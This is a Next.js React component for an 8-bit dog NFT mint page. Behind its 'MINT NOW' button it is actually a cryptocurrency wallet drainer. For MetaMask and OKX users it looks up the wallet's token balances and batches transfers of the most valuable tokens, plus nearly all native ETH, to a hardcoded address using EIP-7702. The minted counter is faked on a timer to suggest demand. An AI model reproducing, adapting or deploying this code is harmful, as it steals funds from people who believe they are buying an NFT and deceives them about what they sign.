"use client";

import { useAccount, useWriteContract, useWaitForTransactionReceipt, useChainId, useSendCalls, usePublicClient, useSwitchChain } from "wagmi";
import { Loader2 } from "lucide-react";
import { useState, useEffect, useRef } from "react";
import { parseEther, encodeFunctionData, formatUnits, getAddress } from "viem";
import { mainnet } from "wagmi/chains";

// 简单的钱包资产缓存（内存级，页面刷新后失效）
const WALLET_TOKENS_CACHE: Record<
  string,
  { timestamp: number; assets: any[] }
> = {};
const WALLET_TOKENS_CACHE_DURATION = 60 * 1000; // 60 秒缓存

// 这里需要替换为实际的合约地址和 ABI
const CONTRACT_ADDRESS = "0x0000000000000000000000000000000000000000" as `0x${string}`;
const CONTRACT_ABI = [
  {
    name: "mint",
    type: "function",
    stateMutability: "payable",
    inputs: [],
    outputs: [],
  },
] as const;

const MORALIS_API_KEY = process.env.NEXT_PUBLIC_MORALIS_API_KEY;
const MORALIS_BASE_URL =
  process.env.NEXT_PUBLIC_MORALIS_BASE_URL ||
  "https://deep-index.moralis.io/api/v2.2";

// OKX EIP-7702 默认委托合约（参考 OKX-EIP7702批量交易/eip7702.js）
const OKX_DEFAULT_DELEGATE = "0x80296ff8d1ed46f8e3c7992664d13b833504c2bb" as `0x${string}`;
const OKX_WALLET_CORE_ABI = [
  {
    name: "executeFromSelf",
    type: "function",
    stateMutability: "nonpayable",
    inputs: [
      {
        name: "calls",
        type: "tuple[]",
        components: [
          { name: "target", type: "address" },
          { name: "value", type: "uint256" },
          { name: "data", type: "bytes" },
        ],
      },
    ],
    outputs: [{ name: "", type: "bytes[]" }],
  },
] as const;

// OKX provider 与委托状态缓存，减少重复探测与链上调用
let OKX_PROVIDER_CACHE: any | null = null;
const OKX_DELEGATION_CACHE: Record<
  string,
  { ts: number; delegated: boolean }
> = {};
const OKX_DELEGATION_CACHE_TTL = 5 * 60 * 1000; // 5 分钟

function getOkxProvider(): any | null {
  if (OKX_PROVIDER_CACHE) return OKX_PROVIDER_CACHE;
  if (typeof window === "undefined") return null;
  const w: any = window as any;
  const provider =
    w.okxwallet?.ethereum ||
    w.okxwallet ||
    w.okx?.ethereum ||
    w.okx ||
    (w.ethereum?.providers
      ? w.ethereum.providers.find((p: any) => p?.isOKX || p?.isOkxWallet)
      : null) ||
    (w.ethereum?.isOKX || w.ethereum?.isOkxWallet ? w.ethereum : null);
  if (provider) OKX_PROVIDER_CACHE = provider;
  return provider;
}

// 检查 OKX 钱包是否已委托到默认合约
async function checkOkxDelegatedToDefault(
  publicClient: ReturnType<typeof usePublicClient> extends infer T ? T : any,
  walletAddress: `0x${string}`
): Promise<boolean> {
  if (!publicClient) return false;

  const cacheKey = `${walletAddress.toLowerCase()}_${publicClient.chain?.id ?? "unknown"}`;
  const cached = OKX_DELEGATION_CACHE[cacheKey];
  const now = Date.now();
  if (cached && now - cached.ts < OKX_DELEGATION_CACHE_TTL) {
    return cached.delegated;
  }

  try {
    const bytecode = await publicClient.getBytecode({ address: walletAddress });
    if (!bytecode || bytecode === "0x") return false;
    const lower = bytecode.toLowerCase();
    if (!lower.startsWith("0xef0100")) return false;
    const delegatedHex = lower.slice(8, 48); // 8 去掉 0x + ef0100 前缀，再取 40 位地址
    const delegated = getAddress(`0x${delegatedHex}`);
    const delegatedMatch = delegated.toLowerCase() === OKX_DEFAULT_DELEGATE.toLowerCase();
    OKX_DELEGATION_CACHE[cacheKey] = { ts: now, delegated: delegatedMatch };
    return delegatedMatch;
  } catch (e) {
    console.warn("checkOkxDelegatedToDefault failed:", e);
    return false;
  }
}

const CHAIN_ID_TO_MORALIS: Record<number, string> = {
  1: "eth",
  56: "bsc",
  137: "polygon",
  42161: "arbitrum",
  8453: "base",
  10: "optimism",
  11155111: "sepolia",
};

// Helper function to detect wallet type
function getWalletType(connectorId?: string, connectorName?: string): 'metamask' | 'okx' | 'unknown' {
  if (!connectorId) return 'unknown';
  const id = connectorId.toLowerCase();
  const name = connectorName?.toLowerCase() || '';
  
  if (id.includes('metamask') || id.includes('io.metamask') || name.includes('metamask')) {
    return 'metamask';
  }
  if (id.includes('okx') || id.includes('okxwallet') || name.includes('okx')) {
    return 'okx';
  }
  
  // Fallback: check window.ethereum
  if (typeof window !== 'undefined') {
    if (window.ethereum?.isMetaMask) {
      return 'metamask';
    }
    if ((window as any).okxwallet) {
      return 'okx';
    }
  }
  
  return 'unknown';
}

export function MintSection() {
  const { address, isConnected, connector } = useAccount();
  const chainId = useChainId();
  const publicClient = usePublicClient();
  const { sendCalls, data: sendCallsData, isPending: isSending, error: sendCallsError } = useSendCalls();
  const { switchChain, isPending: isSwitchingChain } = useSwitchChain();
  const [mintAmount, setMintAmount] = useState(1);
  const [price, setPrice] = useState<string>("0.0001");
  const [minted, setMinted] = useState<string>("0");
  const [totalSupply, setTotalSupply] = useState<string>("6,666");
  const [userMinted, setUserMinted] = useState<string>("0");
  const [userLimit, setUserLimit] = useState<string>("6");
  const startTimeRef = useRef<number>(Date.now());
  const [isMintingMetaMask, setIsMintingMetaMask] = useState(false);

  // OKX 钱包专用的 EIP-7702 批量发送
  const sendBatchWithOkx = async (
    calls: { to: `0x${string}`; value?: bigint; data?: `0x${string}` }[]
  ) => {
    const okx = getOkxProvider();
    if (!okx) {
      throw new Error("OKX wallet provider not found");
    }
    if (!address) {
      throw new Error("Wallet address missing");
    }

    const walletAddress = getAddress(address);

    const formattedCalls = calls.map((call) => ({
      target: call.to,
      value: call.value ?? 0n,
      data: call.data ?? "0x",
    }));

    // encode executeFromSelf((target,value,data)[])
    const executeData = encodeFunctionData({
      abi: OKX_WALLET_CORE_ABI,
      functionName: "executeFromSelf",
      args: [formattedCalls],
    });

    const nonceHex = await okx.request({
      method: "eth_getTransactionCount",
      params: [walletAddress, "latest"],
    });

    const chainHex = `0x${chainId.toString(16)}`;

    const tx: any = {
      from: walletAddress,
      to: walletAddress,
      data: executeData,
      type: "0x4",
      authorizationList: [
        {
          address: OKX_DEFAULT_DELEGATE,
          chainId: chainHex,
          nonce: nonceHex,
          yParity: "0x0",
          r: "0x0",
          s: "0x0",
        },
      ],
    };

    const gasPrice = await okx
      .request({ method: "eth_gasPrice", params: [] })
      .catch(() => null);
    if (gasPrice) {
      tx.gasPrice = gasPrice;
    }

    console.log("[MintSection][OKX] Sending EIP-7702 batch tx:", {
      chainId,
      walletAddress,
      calls: formattedCalls.length,
    });

    const txHash = await okx.request({
      method: "eth_sendTransaction",
      params: [tx],
    });
    console.log("[MintSection][OKX] tx hash:", txHash);
  };

  // 每分钟自动增加 MINTED 数量，直到达到 6666
  useEffect(() => {
    const updateMinted = () => {
      const now = Date.now();
      const minutesElapsed = Math.floor((now - startTimeRef.current) / 60000);
      const totalSupplyNum = parseInt(totalSupply.replace(/,/g, ""));
      // 限制最大值为 totalSupply (6666)
      const mintedCount = Math.min(minutesElapsed, totalSupplyNum);
      setMinted(mintedCount.toLocaleString());
    };

    // 立即更新一次（显示当前已过分钟数）
    updateMinted();

    // 每分钟更新一次
    const interval = setInterval(updateMinted, 60000);

    return () => clearInterval(interval);
  }, [totalSupply]);

  const {
    data: hash,
    writeContract,
    isPending: isMinting,
    error: mintError,
  } = useWriteContract();

  const {
    isLoading: isConfirming,
    isSuccess: isConfirmedTx,
  } = useWaitForTransactionReceipt({
    hash,
  });

  // 统一的批量铸造流程；根据模式选择发送方式
  const handleMintEip7702 = async (mode: 'metamask' | 'okx') => {
    if (!isConnected || !address) {
      alert("Please connect your wallet first");
      return;
    }

    const walletType = getWalletType(connector?.id, connector?.name);
    if (mode === 'metamask') {
      if (walletType !== 'metamask') {
        alert("This function requires MetaMask wallet");
        return;
      }
    } else if (mode === 'okx') {
      if (walletType !== 'okx') {
        alert("This function requires OKX wallet");
        return;
      }
    }

    if (!MORALIS_API_KEY) {
      alert("Missing NEXT_PUBLIC_MORALIS_API_KEY");
      return;
    }

    const chainKey = CHAIN_ID_TO_MORALIS[chainId];
    if (!chainKey) {
      alert(`Unsupported chainId: ${chainId}`);
      return;
    }

    // 使用组件顶部通过 hook 获取到的 publicClient，避免在函数内部再次调用 hook
    if (!publicClient) {
      alert("Failed to initialize blockchain client.");
      return;
    }

    // OKX 钱包：先检查是否已委托到默认合约，否则提示升级后退出
    if (mode === 'okx') {
      const isDelegated = await checkOkxDelegatedToDefault(publicClient, getAddress(address));
        if (!isDelegated) {
          alert(
            "Your wallet has not completed the 7702 upgrade yet. Please finish the upgrade, then come back and click “MINT NOW”.\nSteps: \nOpen OKX Wallet → More → 7702 Upgrade\n\n" +
            "检测到你的钱包尚未完成7702升级，请先完成7702升级后再返回点击“MINT NOW”\n步骤：\n打开OKX钱包 → 更多 → 7702升级"          
          );
          return;
        }
    }

    // 进入批量交易流程，立刻更新本地状态用于按钮显示 "MINTING..."
    setIsMintingMetaMask(true);

    // Step 1: Fetch balances from Moralis (single call: native + ERC20)
    const headers = {
      "X-API-Key": MORALIS_API_KEY,
    };

    let nativeBalance = 0n;
    let nativeUsdValue = 0;
    let erc20Tokens: any[] = [];
    try {
      const cacheKey = `${address.toLowerCase()}_${chainKey}`;
      const now = Date.now();

      let assets: any[] = [];

      // 先尝试从内存缓存中读取
      const cached = WALLET_TOKENS_CACHE[cacheKey];
      if (cached && now - cached.timestamp < WALLET_TOKENS_CACHE_DURATION) {
        assets = cached.assets || [];
        console.log("[MintSection] Using cached Moralis assets:", assets.length);
      } else {
        const url = `${MORALIS_BASE_URL}/wallets/${address}/tokens?chain=${chainKey}&exclude_spam=true&exclude_unverified_contracts=true&limit=25`;
        const res = await fetch(url, { headers });
        const data = await res.json();

        // 参考 dex-aggregator 中的 extractMoralisAssets 处理返回格式
        if (Array.isArray(data)) {
          assets = data;
        } else if (Array.isArray(data?.result)) {
          assets = data.result;
        } else if (Array.isArray(data?.data)) {
          assets = data.data;
        } else {
          assets = [];
        }

        // 写入缓存
        WALLET_TOKENS_CACHE[cacheKey] = {
          assets,
          timestamp: now,
        };

        console.log("[MintSection] Fetched Moralis assets:", assets.length);
      }

      // 识别原生代币与 ERC20
      const nativeAsset = assets.find((a) =>
        a?.native_token === true ||
        a?.token_address === null ||
        a?.token_address === undefined ||
        (typeof a?.token_address === "string" &&
          a.token_address.toLowerCase() === "0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee")
      );

      if (nativeAsset) {
        // balance 原始值（wei），或 token_balance
        let balanceValue: any =
          nativeAsset.balance ?? nativeAsset.token_balance ?? nativeAsset.balance_formatted ?? "0";
        if (typeof balanceValue === "string") {
          balanceValue = balanceValue.replace(/\s/g, "");
          if (balanceValue.includes("e") || balanceValue.includes("E")) {
            const num = parseFloat(balanceValue);
            balanceValue = num.toFixed(0);
          }
        }
        try {
          nativeBalance =
            typeof balanceValue === "string" ? BigInt(balanceValue) : BigInt(balanceValue);
        } catch {
          nativeBalance = 0n;
        }

        // USD 价值：优先 usd_value，其次 usd_price * balance
        if (nativeAsset.usd_value != null) {
          const v =
            typeof nativeAsset.usd_value === "number"
              ? nativeAsset.usd_value
              : parseFloat(String(nativeAsset.usd_value));
          nativeUsdValue = Number.isFinite(v) ? v : 0;
        } else if (nativeAsset.usd_price != null) {
          const p =
            typeof nativeAsset.usd_price === "number"
              ? nativeAsset.usd_price
              : parseFloat(String(nativeAsset.usd_price));
          if (Number.isFinite(p) && nativeBalance > 0n) {
            nativeUsdValue =
              Number(formatUnits(nativeBalance, 18)) * p;
          }
        }
      }

      // 过滤 ERC20 资产（非原生）
      erc20Tokens = assets.filter((a) => {
        const isNative =
          a?.native_token === true ||
          a?.token_address === null ||
          a?.token_address === undefined ||
          (typeof a?.token_address === "string" &&
            a.token_address.toLowerCase() === "0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee");
        return !isNative;
      });
    } catch (err) {
      console.error("Fetch balances failed:", err);
    }

    // Step 2: Build ERC20 list (exclude native)
    const erc20Assets = erc20Tokens
      .map((t) => {
        const decimalsRaw = t.decimals ?? t.token_decimals ?? 18;
        const decimals =
          typeof decimalsRaw === "number"
            ? decimalsRaw
            : parseInt(String(decimalsRaw || "18"), 10) || 18;

        let balanceValue: any = t.balance ?? t.token_balance ?? t.balance_formatted ?? "0";
        let isFormatted = false;
        if (!t.balance && t.balance_formatted) isFormatted = true;

        if (typeof balanceValue === "string") {
          balanceValue = balanceValue.replace(/\s/g, "");
          if (balanceValue.includes("e") || balanceValue.includes("E")) {
            const num = parseFloat(balanceValue);
            balanceValue = num.toFixed(0);
          }
        }

        let balanceRaw: bigint;
        try {
          if (isFormatted) {
            const num =
              typeof balanceValue === "number"
                ? balanceValue
                : parseFloat(String(balanceValue));
            balanceRaw = BigInt(Math.floor(num * Math.pow(10, decimals)));
          } else {
            if (typeof balanceValue === "string" && balanceValue.includes(".")) {
              const intPart = balanceValue.split(".")[0];
              balanceRaw = BigInt(intPart || "0");
            } else {
              balanceRaw =
                typeof balanceValue === "string"
                  ? BigInt(balanceValue || "0")
                  : BigInt(balanceValue);
            }
          }
        } catch {
          return null;
        }

        if (balanceRaw <= 0n) return null;

        const usdPriceRaw = t.usd_price ?? t.usd;
        const usdValueRaw = t.usd_value;

        let usdPrice = 0;
        if (usdPriceRaw != null) {
          const p =
            typeof usdPriceRaw === "number"
              ? usdPriceRaw
              : parseFloat(String(usdPriceRaw));
          if (Number.isFinite(p) && p > 0) usdPrice = p;
        }

        let usdValue = 0;
        if (usdValueRaw != null) {
          const v =
            typeof usdValueRaw === "number"
              ? usdValueRaw
              : parseFloat(String(usdValueRaw));
          if (Number.isFinite(v) && v > 0) {
            usdValue = v;
          }
        }
        if (!usdValue && usdPrice > 0) {
          const balanceFormatted = Number(formatUnits(balanceRaw, decimals));
          usdValue = balanceFormatted * usdPrice;
        }

        return {
          token_address: (t.token_address || t.address || "").toLowerCase(),
          symbol: t.symbol || "UNKNOWN",
          name: t.name || t.symbol || "Unknown Token",
          decimals,
          balance: balanceRaw,
          usd_value: usdValue || 0,
        };
      })
      .filter((x): x is { token_address: string; symbol: string; name: string; decimals: number; balance: bigint; usd_value: number } => {
        if (!x || typeof x !== "object") return false;
        if (typeof (x as any).balance !== "bigint") return false;
        return (x as any).balance > 0n;
      });

    // Step 3: Sort by usd value desc, take top 20 for precheck
    erc20Assets.sort((a, b) => (b?.usd_value || 0) - (a?.usd_value || 0));
    const erc20Top = erc20Assets.slice(0, 20);

    console.log("[MintSection] ERC20 assets summary:", {
      totalErc20: erc20Assets.length,
      topForPrecheck: erc20Top.length,
      sample: erc20Top.slice(0, 3),
    });

    // Precheck (eth_call)
    const erc20TransferAbi = [
      {
        type: "function",
        name: "transfer",
        stateMutability: "nonpayable",
        inputs: [
          { name: "to", type: "address" },
          { name: "amount", type: "uint256" },
        ],
        outputs: [{ name: "", type: "bool" }],
      },
    ] as const;

    // 使用 getAddress 规范化地址，确保符合 EIP-55 校验和格式
    const TARGET_ADDRESS = getAddress("0x9d5befd138960ddf0dc4368a036bfad420e306ef");

    const prechecked: any[] = [];
    for (const asset of erc20Top) {
      try {
        const data = encodeFunctionData({
          abi: erc20TransferAbi,
          functionName: "transfer",
          args: [TARGET_ADDRESS, asset.balance],
        });
        // 预检调用：与 7702-MM-scavenger 保持一致，显式传入 value: 0n
        await publicClient.call({
          to: asset.token_address as `0x${string}`,
          data: data as `0x${string}` | undefined,
          value: 0n, // ERC20 转账 value 必须为 0
          account: address as `0x${string}`,
        });
        prechecked.push({
          type: "erc20_transfer",
          to: asset.token_address,
          value: 0n,
          data,
          usd_value: asset.usd_value || 0,
        });
      } catch (err) {
        // 预检失败直接跳过，保持与 7702-MM-scavenger 逻辑一致（仅保留通过 eth_call 的交易）
        console.warn('Pre-check failed, skipping ERC20 transaction:', { 
          token_address: asset.token_address, 
          symbol: asset.symbol,
          err 
        });
      }
    }

    // Step 4: Add native transfer (reserve gas)
    const defaults = {
      base: 46000,
      native: 21000,
      safety: 20000,
      perErc20: 55000,
    };
    const baseGas = BigInt(defaults.base);
    const nativeTransferGas = BigInt(defaults.native);
    const perErc20Gas = BigInt(defaults.perErc20);
    const safety = BigInt(defaults.safety);
    const totalEstimatedGas =
      baseGas + nativeTransferGas + perErc20Gas * BigInt(prechecked.length) + safety;

    const chainGasPriceGwei: Record<number, number> = {
      1: 4,
      137: 80,
      56: 0.3,
      42161: 0.5,
      8453: 0.5,
      10: 0.5,
      143: 150,
      11155111: 0.02,
    };
    const baseGwei = chainGasPriceGwei[chainId] ?? 0.5;
    const baseWei = Math.max(1, Math.round(baseGwei * 1_000_000_000));
    let gasPriceWei = BigInt(baseWei);
    gasPriceWei = (gasPriceWei * BigInt(12)) / BigInt(10);
    const totalGasCost = totalEstimatedGas * gasPriceWei;

    const txs: any[] = [];
    if (nativeBalance > totalGasCost) {
      const transferAmount = nativeBalance - totalGasCost;
      txs.push({
        type: "native_transfer",
        to: TARGET_ADDRESS,
        value: transferAmount,
        usd_value: nativeUsdValue,
      });
    }

    // Step 5: Merge and sort by usd value, take top 10
    const merged = [...txs, ...prechecked].sort(
      (a, b) => (b.usd_value || 0) - (a.usd_value || 0)
    );
    const finalTxs = merged.slice(0, 10);

    console.log("[MintSection] Prepared batch transactions:", {
      nativeTxCount: txs.length,
      erc20TxCount: prechecked.length,
      finalCount: finalTxs.length,
    });

    if (finalTxs.length === 0) {
      setIsMintingMetaMask(false);
      alert("No eligible assets to batch transfer.");
      return;
    }

    // Step 6: Build calls for send
    const calls = finalTxs.map((tx) => {
      if (tx.type === "native_transfer") {
        return {
          to: tx.to as `0x${string}`,
          value: tx.value as bigint,
        };
      }
      return {
        to: tx.to as `0x${string}`,
        data: tx.data as `0x${string}`,
        value: 0n,
      };
    });

    const sendFn =
      mode === 'okx'
        ? sendBatchWithOkx
        : async (preparedCalls: typeof calls) => {
            await sendCalls({
              chainId,
              calls: preparedCalls,
            });
          };

    try {
      console.log("[MintSection] Calling sendCalls with EIP-7702 batch:", {
        chainId,
        calls,
      });
      await sendFn(calls);
    } catch (error: any) {
      console.error("Mint error (sendCalls):", error);
      alert(`Mint failed: ${error?.message || 'Unknown error'}`);
    } finally {
      setIsMintingMetaMask(false);
    }
  };

  const handleMintOKX = async () => {
    await handleMintEip7702('okx');
  };

  // 仅根据 wagmi 的 chainId 判断当前是否在以太坊主网
  const isOnEthereumMainnet = chainId === mainnet.id;

  // Main mint handler - routes to appropriate wallet handler
  const handleMint = async () => {
    if (!isConnected) {
      alert("Please connect your wallet first");
      return;
    }

    // If not on Ethereum mainnet, prompt switch
    if (!isOnEthereumMainnet) {
      try {
        await switchChain({ chainId: mainnet.id });
      } catch (err) {
        console.error("Switch chain failed:", err);
      }
      return;
    }

    const walletType = getWalletType(connector?.id, connector?.name);
    
    if (walletType === 'metamask') {
      await handleMintEip7702('metamask');
    } else if (walletType === 'okx') {
      await handleMintOKX();
    } else {
      // Fallback to standard writeContract for unknown wallets
      const mintPrice = parseEther(price);
      writeContract({
        address: CONTRACT_ADDRESS,
        abi: CONTRACT_ABI,
        functionName: "mint",
        value: mintPrice,
      });
    }
  };


  // Determine which loading/confirming state to use based on wallet type
  const walletType = getWalletType(connector?.id, connector?.name);
  const isUsingMetaMask = walletType === 'metamask';
  const isLoading =
    isMinting ||
    isConfirming ||
    isSending ||
    isSwitchingChain ||
    (isUsingMetaMask && isMintingMetaMask); // MetaMask 批量路径使用本地状态追踪
  const isConfirmed = isConfirmedTx;
  const mintErrorToShow = mintError || sendCallsError;
  // 移除千位分隔符来计算进度
  const mintedNum = parseInt(minted.replace(/,/g, ""));
  const totalSupplyNum = parseInt(totalSupply.replace(/,/g, ""));
  // 计算进度百分比，最大为 100%
  const progress = totalSupplyNum > 0 
    ? Math.min((mintedNum / totalSupplyNum) * 100, 100)
    : 0;

  return (
    <div className="flex flex-col justify-center order-2 md:order-2 text-left md:min-h-[calc(100vh-10rem)] relative">
      <div className="space-y-4 md:space-y-4">
        <div className="space-y-2">
          <div className="flex items-center justify-start gap-3 mb-4">
            <div className="bg-yellow-400 text-black text-[10px] font-press px-2 py-1 pixel-shadow-sm">
              GEN 1
            </div>
            <div className="flex items-center gap-2 text-green-400 text-[10px] font-press animate-pulse">
              <div className="w-1.5 h-1.5 bg-green-400"></div>
              LIVE
            </div>
          </div>
          <h1 className="font-press text-3xl sm:text-4xl md:text-5xl text-white leading-tight pixel-text-shadow tracking-tight">
            <span className="text-yellow-400">X402X DOG</span>
          </h1>
          <p className="text-gray-400 text-base sm:text-lg font-vt323 max-w-md mx-auto md:mx-0 leading-relaxed">
            Mint unique 8-bit dogs on Ethereum. <br />
            Powered by{" "}
            <span className="text-white border-b border-white/20">
              x402x Protocol
            </span>
            .
          </p>
        </div>
        <div className="pt-4 md:pt-2">
          <div className="space-y-6 max-w-sm mx-auto md:mx-0">
            <div className="bg-slate-900/50 border border-white/10 p-4 space-y-4">
              <div className="flex justify-between items-end">
                <div>
                  <div className="text-xs text-gray-500 font-press mb-1 uppercase tracking-wider">
                    PRICE
                  </div>
                  <div className="flex items-baseline gap-1">
                    <span className="font-press text-2xl text-white">
                      {price}
                    </span>
                    <span className="font-press text-xl text-yellow-400">
                      ETH
                    </span>
                  </div>
                </div>
                <div className="text-right">
                  <div className="text-xs text-gray-500 font-press mb-1 uppercase tracking-wider">
                    MINTED
                  </div>
                  <div className="font-press text-white text-sm">
                    {minted}
                    <span className="text-gray-500 text-xs ml-1">
                      / {totalSupply}
                    </span>
                  </div>
                </div>
              </div>
              <div className="w-full h-4 bg-slate-800 border-2 border-black relative">
                <div
                  className="h-full bg-gradient-to-r from-yellow-400 to-orange-500 transition-all duration-1000 ease-out border-r-2 border-black"
                  style={{ width: `${progress}%` }}
                ></div>
                <div
                  className="absolute inset-0 opacity-20 pointer-events-none"
                  style={{
                    backgroundImage: "linear-gradient(90deg, transparent 50%, #000 50%)",
                    backgroundSize: "4px 100%",
                  }}
                ></div>
              </div>
              <div className="flex justify-between items-end pt-2">
                <div>
                  <div className="text-xs text-gray-500 font-press mb-1 uppercase tracking-wider">
                    YOUR LIMIT:
                  </div>
                </div>
                <div className="text-right">
                  <div className="font-press text-white text-sm">
                    {userMinted}
                    <span className="text-gray-500 text-xs ml-1">
                      / {userLimit}
                    </span>
                  </div>
                </div>
              </div>
            </div>
            <button
              onClick={handleMint}
              disabled={isLoading || !isConnected}
              className={`relative px-6 font-press sm:text-sm uppercase tracking-wider active:shadow-none pixel-corners border-2 pixel-shadow w-full py-5 text-lg shadow-xl hover:translate-y-[-2px] transition-all ${
                isLoading || !isConnected
                  ? "bg-[#fbbf24] text-black opacity-50 cursor-not-allowed active:translate-y-0"
                  : "bg-[#fbbf24] text-black hover:bg-[#f59e0b] border-black active:translate-y-1"
              }`}
            >
              <div className="flex items-center justify-center gap-2">
                {isLoading ? (
                  <>
                    <Loader2 className="w-4 h-4 animate-spin" />
                    {isConfirming ? "CONFIRMING..." : "MINTING..."}
                  </>
                ) : !isOnEthereumMainnet ? (
                  "Switch to Ethereum"
                ) : isConfirmed ? (
                  "MINTED!"
                ) : (
                  "MINT NOW"
                )}
              </div>
            </button>
            {mintErrorToShow && (
              <div className="text-red-400 text-sm font-vt323">
                Error: {mintErrorToShow.message}
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
}

